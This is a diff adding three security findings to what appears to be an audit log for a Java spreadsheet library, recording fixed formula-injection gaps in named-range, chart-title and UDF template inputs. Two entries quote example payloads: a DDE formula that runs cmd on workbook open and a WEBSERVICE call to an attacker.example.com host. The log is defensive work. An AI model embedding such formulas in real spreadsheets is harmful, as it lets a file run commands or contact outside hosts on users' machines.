@@ -351,3 +351,51 @@ FIX: Extended rejectDde() to also reject formulas whose effective body begins wi
 and regression assertions covering all case forms in ProtocolResidualCoverageTest.
 EFFORT: TRIVIAL
 ------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: T4W8X2Y
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/NamedRangeTarget.java
+CATEGORY: SECURITY
+OBSERVATION: NamedRangeTarget.Formula(String formula) stored the formula verbatim with no call to
+FormulaInputSecurity.rejectDde(). Named-range formulas are written into the xlsx defined-names
+part and evaluated automatically by Excel on open or whenever a cell references the range. A
+NamedRangeTarget with {"kind":"FORMULA","formula":"DDE(\"cmd\",\"/C calc\",\"\")"} would bypass
+all existing formula-injection guards (LIM-023, LIM-027, LIM-031) because none of those guards
+are applied at the named-range input layer. The attack succeeds through the FORMULA variant even
+when cell formula input is correctly rejected.
+FIX: Added FormulaInputSecurity.rejectDde(formula) // LIM-032 in NamedRangeTarget.Formula compact
+constructor. Updated FormulaInputSecurity // LIM-032 comment. Added LIM-032 to LIMITATIONS.md.
+Added regression assertions in ProtocolResidualCoverageTest.rejectsFormulaInjectionInNamedRangeChartTitleAndUdfTemplate().
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: V6Z9A3B
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/ChartTitleInput.java
+CATEGORY: SECURITY
+OBSERVATION: ChartTitleInput.Formula(String formula) stored the formula verbatim with no call to
+FormulaInputSecurity.rejectDde(). Chart title formulas are written into the chart XML (<c:f>
+element) and auto-evaluated when Excel renders the chart — which happens on workbook open. A
+chart title with DDE("cmd","/C calc","") or WEBSERVICE("https://attacker.example.com/") executes
+without any user interaction.
+FIX: Added FormulaInputSecurity.rejectDde(formula) // LIM-033 in ChartTitleInput.Formula compact
+constructor. Added LIM-033 to LIMITATIONS.md and regression assertions in ProtocolResidualCoverageTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: C7D1E5F
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/FormulaUdfFunctionInput.java
+CATEGORY: SECURITY
+OBSERVATION: FormulaUdfFunctionInput.formulaTemplate had no DDE/WEBSERVICE rejection. Risk is low
+because: (1) POI's formula evaluator doesn't implement DDE or WEBSERVICE server-side; (2) UDF
+templates are never written to xlsx output — only the call site appears in the file. The gap was
+blocked as defense-in-depth against future evaluation paths or POI changes that could implement
+these functions.
+FIX: Added FormulaInputSecurity.rejectDde(formulaTemplate) // LIM-034 after the normalization step
+in the canonical constructor. Added LIM-034 to LIMITATIONS.md and regression assertions.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
